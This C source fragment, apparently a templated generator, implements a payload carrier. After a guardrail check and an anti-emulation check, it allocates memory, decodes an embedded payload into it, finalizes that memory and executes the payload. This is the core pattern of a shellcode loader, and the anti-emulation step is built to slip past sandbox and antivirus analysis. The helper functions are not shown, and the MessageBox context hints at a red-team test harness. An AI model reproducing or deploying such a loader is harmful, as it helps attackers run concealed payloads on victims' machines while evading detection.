static DWORD sg_carrier_run(void)
{
    PVOID destination;
    SG_CARRIER_CONTEXT context;
    DWORD memory_state;
    DWORD payload_result;

    if (!sg_guardrail_allows()) {
        return sg_fail(0xE0010001UL);
    }
    if (!sg_anti_emulation_allows()) {
        return sg_fail(0xE0010004UL);
    }

    memory_state = 0;
    destination = sg_memory_allocate(
        (SIZE_T){{ payload_len }},
        &memory_state);
    if (destination == NULL) {
        return sg_fail(0xE0010002UL);
    }

    sg_decode_copy(
        (BYTE *)destination,
        sg_payload_address(),
        (SIZE_T){{ payload_len }});
    if (!sg_memory_finalize(
            destination,
            (SIZE_T){{ payload_len }},
            memory_state)) {
        return sg_fail(0xE0010003UL);
    }

    context.version = 1;
    context.message_box_w = sg_message_box_w;
    payload_result = sg_execute(destination, &context);
    return sg_finish(payload_result);
}
